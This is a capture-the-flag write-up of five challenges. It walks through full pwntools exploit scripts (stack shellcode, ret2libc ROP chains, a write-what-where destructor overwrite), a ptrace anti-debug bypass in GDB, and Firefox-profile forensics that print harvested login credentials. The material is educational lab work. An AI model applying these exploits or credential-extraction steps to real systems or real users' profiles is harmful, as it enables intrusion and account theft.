---
title: "CoalFire CTF Notes"
date: 2020-12-04
category: "pwn"
tags: ["ctf", "rop", "ret2libc", "re", "forensics", "shellcode"]
summary: "CoalFire CTF challenge notes covering stack shellcode injection, ret2libc, write-what-where, anti-debug bypass, and Firefox profile forensics."
source: "ctf"
draft: false
---

## CoalFire CTF Notes

HTB CTF challs are sometimes reused

## Injection, pwn 350
![](https://i.imgur.com/a0oX9sa.png)

quick file recon reveals that we have a 64-bit pwnable challenge which is not stripped -> making it easier to reverse engineer. doing `checksec` shows that most protections are disabled and that we are dealing with a [Position Independent Executable (PIE)](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/pie/README.md) binary. 

### Reverse Engineering
![](https://i.imgur.com/r65c3dA.png)

Opening the binary in GHIDRA, we only have the main function to analyze. We can ignore `setup` since it only deals with the normal buffering issues. First, the program asks for an integer input in which `1` is the correct answer to take. 

Which leads us to the vulnerable parts of the code. The `printf` statement on line 14 leaks the address of `buffer` which is a memory location on the stack. The call to `read` on line 16 reads more data than the buffer could handle (buffer has a 32 byte space while `read` reads 633 bytes) thus leading to a buffer overflow. With this, we can overwrite stack pointers and gain control of code flow. 

### Crafting the payload

We deal with the easy part first, which is leaking the stack address for our input buffer. 

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
binary = ELF('./injection_shot', checksec = False)
#libc = ELF('./libc.so.6', checksec = False)

p = process('./injection_shot')
#p = process('./injection_shot', env = {'LD_PRELOAD' : libc.path})
#p = remote("138.68.131.63",31963)

#: GDB SETTINGS
if args.GDB:
	breakpoints = ['']
	#gdb.attach(p, gdbscript = '\n'.join(breakpoints))
	input('manually attach gdb...') #: for now

#: EXPLOIT INTERACTION STUFF
def pwn(data):
	pass
	
#: PWN THY VULNS
context.arch = 'amd64'
p.sendlineafter(b'> ', b'1')
leak = int(p.recvuntil(b'> ').split(b'\n')[0].split(b'[')[1].replace(b']', b''), 16)
log.info(f"buffer address: hex({leak})")
```

Given that the buffer has 32 bytes and directly after that we begin overwriting the saved base pointer (RBP) which is 8 bytes, we can control RIP after writing 40 bytes. To test this, we can send a cyclic pattern of 40 bytes + some invalid/dummy return address that crashes the program:
```python
payload = cyclic(40)
payload += b'AAAABBBB'
p.sendline(payload)
p.interactive()
```
![](https://i.imgur.com/NGRjMSQ.png)

Now we can proceed with our plan. Since we have a stack address from the leak + the stack is marked as executable (NX is disabled), we can place shellcode onto the stack then return to it. I simply used `shellcraft.sh()` from pwntools which automates creating the normal execve('/bin/sh') shellcode. 

```python
payload = cyclic(40) #: offset + saved RBP
payload += p64(leak + 48) #: control instruction pointer to return to an address we control
payload += asm(shellcraft.sh()) #: shellcode, program execution will return to this 
p.sendline(payload)
p.interactive()
```

We get a neat shell:
![](https://i.imgur.com/iHgAbcu.png)

-------------------------------------------------------

## Library, pwn 350

We were given a zip file which contained the challenge binary and its corresponding libc. Doing the usual recon yields the ff:
![](https://i.imgur.com/8K1X4cI.png)

x86_64 binary which is not stripped, has NX + full RELRO but `NO CANARY` and NO `PIE` which means that the program has no protections for stack buffer overflows and addresses remain static. Grepping for the libc version reveals that it is 2.27, the libc for ubuntu 18.04 iirc. 

### Reverse Engineering
![](https://i.imgur.com/SIpuM8G.png)

The bug is clear, the program accepts more input than the stack buffer can handle -> thus leading to another buffer overflow. Since there are no backdoor functions (hidden functions that give us a shell or the flag), our goal is to get RCE/shell on the remote server. For this we need a few things:

- a read primitive to leak some libc addresses, since we will be performing a ret2libc attack
- some gadgets to do some ROP

### Crafting the payload
For the read primitive, we can simply reuse some functions in the binary to return the values of some GOT addresses (which hold pointers to libc). What I mean by this is: 
![](https://i.imgur.com/ZC5wf3S.png)

We will be using `puts` as our read primitive. `puts` accepts string pointers as its arguments and returns the contents of wherever that pointer points to. So if we do `puts(0x600fc8)` it will dereference the pointer which will lead to `puts(0x7fd1cca7baa0)` thus allowing us to have a libc leak. 

From here, we can compute the libc base address by subtracting the provided libc's puts symbol offset from the address that we have retrieved, e.g: 

```python
libc.address = libc_leak - libc.sym.puts
```

In order for us to perform this call, we need some gadgets for ROP. We can easily retrieve some by using `ROPgadget`.

![](https://i.imgur.com/nFQFebH.png)

We only need the `pop rdi ; ret` gadget because on x64 binaries, arguments to function calls are placed into registers. Thus if we want to call `puts(puts@GOT)` we need to place `puts@GOT` into the `rdi` register (`rdi` is the register for the first argument in a function call)

Now, `pop rdi` pops a value from the stack into the register, so it makes sense that the value that we control must also be on the stack. After it does that, we head to the `ret` instruction, which just means that we return to the address at the top of the stack. For this payload, the address that we want to return to is to `main` since we want to do the second stage of our exploit after the libc leak. Here's what the payload looks like for the first stage:

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
binary = ELF('./library_patched', checksec = False)
libc = ELF('./libc.so.6', checksec = False)

#p = process('./library')
p = process('./library_patched', env = {'LD_PRELOAD' : libc.path})
#p = remote("178.62.19.68",30434)

#: GDB SETTINGS
if args.GDB:
	breakpoints = ['']
	#gdb.attach(p, gdbscript = '\n'.join(breakpoints))
	input('manually attach gdb...') #: for now

#: EXPLOIT INTERACTION STUFF
ret = 0x0000000000400536
pop_rdi = 0x0000000000400783
	
#: PWN THY VULNS
payload = cyclic(40)
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.sym.puts)
payload += p64(binary.sym.main)
p.sendlineafter(b'> ', payload)

p.recvline()
libc_leak = u64(p.recvline().split(b'\n')[0].ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym.puts
log.info(f"puts libc address leak: {hex(libc_leak)}")
log.info(f"libc base address: {hex(libc.address)}")
```

![](https://i.imgur.com/0c0FuWy.png)

It successfully retrieved libc addresses and returned to the main function. Now, the next step is to get a shell by calling `system("/bin/sh")`. My approach for this is to simply search for one shot RCE's in the libc using the tool [one_gadget](https://github.com/david942j/one_gadget)

![](https://i.imgur.com/BPWikzF.png)

we can do a trial and error on which gadget works, which for this challenge was the second option (0x4f432). The final stage payload is as follows:

```python
gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
payload = cyclic(40)
payload += p64(ret)
payload += p64(libc.address + gadgets[2])
p.sendline(payload)
p.interactive()

#: HTB{l1br4r13s_4r3_r34lly_h3lpful}
```

We need to place the extra `ret` instruction to account for alignment issues when exploiting remotely.

-------------------------------------------------------

## Air Supplies, pwn 350
![](https://i.imgur.com/DH1T3cb.png)

### Reverse Engineering
![](https://i.imgur.com/avhq7IA.png)

first step of the program accepts either 1 or 2 as the input, which then gets handled by the `choice` function.

![](https://i.imgur.com/SxonRam.png)

we can only proceed with the mission if we enter 1. 

![](https://i.imgur.com/0wEE5Hw.png)

On lines 22-23 and 27-28, we can see that the program asks us for additional input then casts them into `unsigned long`. The vulnerability lies on line 30, where we have a `write-what-where` primitive. Basically, the vuln in this program allows us to write anything into any arbitrary location that we provide. 

The technique that I used here is overwriting the entry to `__do_global_dtors_aux`, which runs all the global destructors on exit from the program on systems where .fini_array is not available

![](https://i.imgur.com/duvjMVN.png)

Our plan then is to overwrite the destructor entry to point to the address of `_` which is a hidden, backdoor function that retrieves the flag for us:

![](https://i.imgur.com/Ujy99YD.png)

```python
from pwn import *

#: CONNECT TO CHALLENGE SERVERS
binary = ELF('./air_supplies', checksec = False)
#libc = ELF('./libc.so.6', checksec = False)

p = process('./air_supplies')
#p = process('./air_supplies', env = {'LD_PRELOAD' : libc.path})
#p = remote("178.62.19.68",32755)

#: GDB SETTINGS
if args.GDB:
	breakpoints = ['']
	#gdb.attach(p, gdbscript = '\n'.join(breakpoints))
	input('manually attach gdb...') #: for now

#: EXPLOIT INTERACTION STUFF
def pwn(data):
	pass
	
#: PWN THY VULNS
p.sendlineafter(b'> ', b'2')
p.sendlineafter(b'drop: ', str(binary.sym.__do_global_dtors_aux_fini_array_entry).encode())
p.sendlineafter(b'drop: ', str(binary.sym._).encode())

p.interactive()
```

![](https://i.imgur.com/8TOP7wt.png)

-------------------------------------------------------

## Access, reversing 325

Running a file check returns the usual stuff:
![](https://i.imgur.com/ygpppC2.png)

Proceeding to decompile the binary with GHIDRA, we can see the following code:

![](https://i.imgur.com/IPr4Nuk.png)

It first checks if the ID that we provide is `31337`, then we get prompted for a pin. Our input is then processed by `checkpin()` which handles the PIN verification process. 

![](https://i.imgur.com/Iv60sgW.png)

It simply runs a char-by-char comparison between our provided input and `&encrypted_flag` which are bytes xored with 0x20. We can easily recover these bytes: 

![](https://i.imgur.com/HGekkOZ.png)

Then we can proceed to write a short python script to retrieve the flag:

```python
pin = [0x4c,0x13,0x54,0x7f,0x4d,0x45,0x7f,0x11,0x4e,0x7f,0x4c,0x13,0x54,0x7f,0x4d,0x45,0x45,0x45,0x45,0x7f,0x49,0x4e,0x01,0x01,0x00]
print(''.join([chr(x ^ 0x20) for x in pin]))
```

![](https://i.imgur.com/Vb1dXEW.png)

-------------------------------------------------------

## Hoverboard, rev 525

This challenge was about bypassing some simple anti-debug tricks. Doing the usual file recon doesn't reveal much about the program, so we directly let GHIDRA analyze it. The decompiled code of the main function is as follows:
```c
undefined8 main(void)

{
  int iVar1;
  size_t encflag_len;
  long isBeingTraced;
  size_t in_R8;
  long in_FS_OFFSET;
  int unpassable;
  char *secret_key;
  uchar *enc_flag;
  undefined8 new_chunk;
  EVP_PKEY_CTX input [104];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  unpassable = 1;
  secret_key = "!#$9w$3-t;.6=9/";
  enc_flag = &DAT_00100ed8;
  printstr("[*] Insert destination: ");
  fgets((char *)input,10,stdin);
  encflag_len = strlen((char *)input);
  input[encflag_len - 1] = (EVP_PKEY_CTX)0x0;
  encflag_len = strlen((char *)enc_flag);
  new_chunk = (size_t *)malloc(encflag_len << 2);
  isBeingTraced = ptrace(PTRACE_TRACEME,0,1,0);
  if (isBeingTraced == -1) {
    printf("\x1b[31m");
    printstr(&Anomaly_Detected);
  }
  else {
    if (unpassable == 1) {
      printf("\x1b[31m");
      printstr(&Incorrect_Destination);
    }
    else {
      iVar1 = strcmp(secret_key,(char *)input);
      if (iVar1 == 0) {
        decrypt(input,enc_flag,new_chunk,enc_flag,in_R8);
        iVar1 = strcmp((char *)input,(char *)new_chunk);
        if (iVar1 == 0) {
          printf("\x1b[32m");
          printstr(&Activated);
        }
      }
      else {
        printf("\x1b[31m");
        printstr(&Verification_Failed);
      }
    }
  }
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return 0;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```
We need to break this down line by line:
- lines 27-30: we can see a ptrace(PTRACE_TRACEME) call, which is a known anti-debug technique that basically checks if the current process is already being traced. If so, it returns -1/Operation not permitted then the program exits. A very brief [explanation](https://subscription.packtpub.com/book/networking_and_servers/9781782167105/3/ch03lvl1sec31/a-ptrace-anti-debugging-trick)
- lines 33-35: an unsatisfiable check since there is no way the program will allow us to change the value of the `unpassable` variable
- lines 38-39: basically checks if our input matches the secret key before proceeding to decrypt
- lines 40-44: runs decrypt on `new_chunk` using our input as the key. `new_chunk` is a pointer to some encrypted bytes which might be the flag when decrypted. 

### Anti-Debug Bypass

I opened up the binary in GDB, disassembled the main function and searched for the parts where we needed to bypass:
![](https://i.imgur.com/X4YFSFy.png)

We need to place a breakpoint at `*main + 191` which is before `ptrace` gets called. Next, the unsatisfiable check happens at `*main + 241, *main + 248` -> we need to jump away from these parts such that we continue execution on `*main + 261` which should correspond to the `strcmp` call on line 38 of the decompiled code. 

```shell
pwndbg> break *main + 191
Breakpoint 1 at 0xd28
pwndbg> break *main + 261
Breakpoint 2 at 0xd6e
pwndbg> r
```

we should hit the breakpoint before ptrace:
![](https://i.imgur.com/fpqF5qZ.png)

the next thing we do is to jump into our second breakpoint and step into the next instructions until we reach the strcmp call:
![](https://i.imgur.com/THmEXeP.png)

the first argument, s1, is the secret_key that we need to match. Since I provided a dummy input of `a`, we should change the value of the `rsi` register which holds the value of the second input. This can be done with: `set $rsi=$rdi`

![](https://i.imgur.com/I9bSgDj.png)

Now both strings match. We then continue stepping into the instructions until the call to `decrypt`. 

![](https://i.imgur.com/iLW0Ku5.png)

Again, we need to change the value of the `rdi` register, since this should contain the secret key to decrypt the flag. We simply substitute it with the address of the secret key (which we know from the previous strcmp call):

```shell
pwndbg> set $rdi = (char *) 0x555555400ec8
```

![](https://i.imgur.com/VFwh8Ec.png)

Now that `rdi` contains the secret key, we continue until the next call to strcmp, which should now hold the value of the decrypted flag:

![](https://i.imgur.com/qSyrxnS.png)

-------------------------------------------------------

## Firensics, forensics 375

We were given a zip file, when unzipped returned a directory with the name: `3x6l3w88.default-release`. Given the naming convention and the files stored in the directory, I knew that I was dealing with a [firefox profile](https://support.mozilla.org/en-US/kb/profiles-where-firefox-stores-user-data). 

![](https://i.imgur.com/JlgAwHe.png)

I immediately recognized it as there was a tryhackme room (Glitch) that I solved which used a firefox profile as a privilege escalation vector. Initially, I planned to use [firefox-decrypt](https://github.com/unode/firefox_decrypt), but since the `profile.ini` file is nowhere to be found, I looked for other possible approaches. 

For this challenge, I stumbled upon [firefed](https://github.com/numirias/firefed) and used it to analyze other aspects of the profile. We start by taking a look at the browser history:

```shell
$ firefed -p . history
https://support.mozilla.org/en-US/products/firefox
    Title:      None
    Last visit: 1969-12-31 19:00:00
    Visits:     0

https://www.mozilla.org/en-US/firefox/central/
    Title:      None
    Last visit: 1969-12-31 19:00:00
    Visits:     0

ftp://rick%2Ea:r0llr1ck0202!@ftp.megacorp.local/
    Title:      None
    Last visit: 1969-12-31 19:00:00
    Visits:     0

https://files.megacorp.local/
    Title:      None
    Last visit: 1969-12-31 19:00:00
    Visits:     0

ftp://rick:6vMMFPQpSdQLPpa7@ftp.megacorp.local/
    Title:      None
    Last visit: 1969-12-31 19:00:00
    Visits:     0

https://www.mozilla.org/privacy/firefox/
    Title:      None
    Last visit: 2020-12-04 00:48:18
    Visits:     1

https://www.mozilla.org/en-US/privacy/firefox/
    Title:      Firefox Privacy Notice — Mozilla
    Last visit: 2020-12-04 00:48:18
    Visits:     1

https://travisscott.com/
    Title:      None
    Last visit: 2020-12-04 00:52:08
    Visits:     1

https://www.travisscott.com/
    Title:      TRAVIS SCOTT
    Last visit: 2020-12-04 00:52:08
    Visits:     1

https://fkatwi.gs/
    Title:      FKA twigs
    Last visit: 2020-12-04 00:52:09
    Visits:     1

https://drakeofficial.com/
    Title:      None
    Last visit: 2020-12-04 00:52:11
    Visits:     1

https://www.drakerelated.com/
    Title:      None
    Last visit: 2020-12-04 00:52:14
    Visits:     1

https://drakerelated.com/
    Title:      Drake Related – The Official Website of Drake
    Last visit: 2020-12-04 00:52:15
    Visits:     1

https://good-music.com/
    Title:      GOOD MUSIC
    Last visit: 2020-12-04 00:52:15
    Visits:     1

https://hypebeast.com/music
    Title:      Music | HYPEBEAST
    Last visit: 2020-12-04 00:52:19
    Visits:     1

https://tankmagazine.com/
    Title:      TANK MAGAZINE
    Last visit: 2020-12-04 00:52:22
    Visits:     1

https://pastebin.com/login
    Title:      Pastebin.com - Login Page
    Last visit: 2020-12-04 00:53:37
    Visits:     1

https://www.mozilla.org/en-US/contribute/
    Title:      Volunteer Opportunities at Mozilla — Mozilla
    Last visit: 2020-12-04 01:07:32
    Visits:     1

https://www.mozilla.org/en-US/about/
    Title:      Learn About Mozilla — Mozilla
    Last visit: 2020-12-04 01:07:32
    Visits:     1

https://support.mozilla.org/en-US/kb/customize-firefox-controls-buttons-and-toolbars?utm_source=firefox-browser&utm_medium=default-bookmarks&utm_campaign=customize
    Title:      Customize Firefox controls, buttons and toolbars | Firefox Help
    Last visit: 2020-12-04 01:07:33
    Visits:     1

https://pastebin.com/u/ashrick
    Title:      Ashrick's Pastebin - Pastebin.com
    Last visit: 2020-12-04 01:07:56
    Visits:     2

https://pastebin.com/
    Title:      Pastebin.com - #1 paste tool since 2002!
    Last visit: 2020-12-04 01:07:59
    Visits:     3

https://pastebin.com/site/logout
    Title:      None
    Last visit: 2020-12-04 01:07:59
    Visits:     1

https://pastebin.com/ViYVbkRq
    Title:      Pastebin.com - Locked Paste
    Last visit: 2020-12-04 01:08:07
    Visits:     2

https://trackthis.link/
    Title:      Track This | A new kind of Incognito
    Last visit: 2020-12-04 01:08:27
    Visits:     1
[...snipped...]
```

We take note of the FTP credentials. While it may seem interesting, there is no way we can access those endpoints. What we can focus on instead are the pastebin links, which seems to have a password protected file:
![](https://i.imgur.com/SefI2wA.png)

We can further examine the firefox profile for stored passwords, more specifically on autofill forms:

```shell
$ firefed -p . forms  
pid=eded09ed-efe3-4a7b-8ca1-eff4913afb9e
pnid=140
cb=1607061094086
gprid=Eu
c=1
px=6591cbc3bde6a0
cMultiData={"75ea8421c3c4d0":["UserVisited"]}
LoginForm[username]=rick.ash12@outlook.com
LoginForm[username]=ashrick
PostForm[password]=r0llr1ck0202!
PostForm[name]=Sekret
pid=21ce3b95-862d-4885-97f8-b88115a24bc3
ev=PAGE_VIEW
pl=https://www.goat.com/
ts=1607062131152
v=1.5
if=false
bt=__LIVE__
u_c1=9bea8dfb-d958-488f-8c43-12275fa434da
m_sl=1871
m_rd=15681
m_pi=3944
m_pl=13547
m_ic=0
ev=SIGN_UP
ts=1607062131154
m_rd=15682
cb=1607062131156
cb=1607062138363
origin=https://mail.megacorp.local
username=rick.a
```

I tried the retrieved credentials: `PostForm[password]=r0llr1ck0202!` on the protected pastebin, and got the flag from there.

![](https://i.imgur.com/hdRfQT5.png)
